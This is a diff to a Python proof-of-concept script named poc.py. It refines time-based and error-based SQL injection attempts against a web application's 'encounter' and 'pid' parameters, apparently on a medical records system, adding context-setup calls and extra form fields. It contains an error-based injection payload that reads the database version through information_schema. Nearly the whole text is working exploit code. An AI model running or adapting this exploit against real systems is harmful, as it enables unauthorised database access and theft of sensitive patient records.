@@ -1,0 +1,42 @@
+--- a/poc.py
++++ b/poc.py
+@@ -203,17 +237,20 @@ def test_sqli(session, target, site, delay=3):
+         endpoint_baseline = baseline_time
+         try:
+             start = time.time()
+-            check = session.get(vuln_url, params={"encounter": "1", "pid": "1"}, verify=False, timeout=10)
++            check = session.get(vuln_url, params={"encounter": "1", "pid": "1", "formdir": "vitals"}, verify=False, timeout=10)
+             if check.status_code == 404:
+                 continue  
++            endpoint_baseline = time.time() - start
+         except:
+             continue
+ 
+         for payload in payloads:
+-            params = {"encounter": payload, "pid": "1"}
++            params = {"encounter": payload, "pid": "1", "formdir": "vitals", "formid": "1"}
+ 
+             try:
+                 start_time = time.time()
++                # Re-setup context before each injection attempt
++                setup_encounter_context(session, target)
+                 resp = session.get(vuln_url, params=params, verify=False, timeout=delay + 15)
+                 elapsed = time.time() - start_time
+ 
+@@ -273,12 +316,14 @@ def test_sqli(session, target, site, delay=3):
+         "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+         "1'",
+     ]
+-
++    
+     print("[*] Trying error-based SQL injection...")
++    setup_encounter_context(session, target)
++    
+     for endpoint in vuln_endpoints:
+         url = urljoin(target, endpoint)
+         for payload in error_payloads:
+-            params = {"encounter": payload, "pid": "1"}
++            params = {"encounter": payload, "pid": "1", "formdir": "vitals", "formid": "1"}
+ 
+             try:
+                 start_time = time.time()
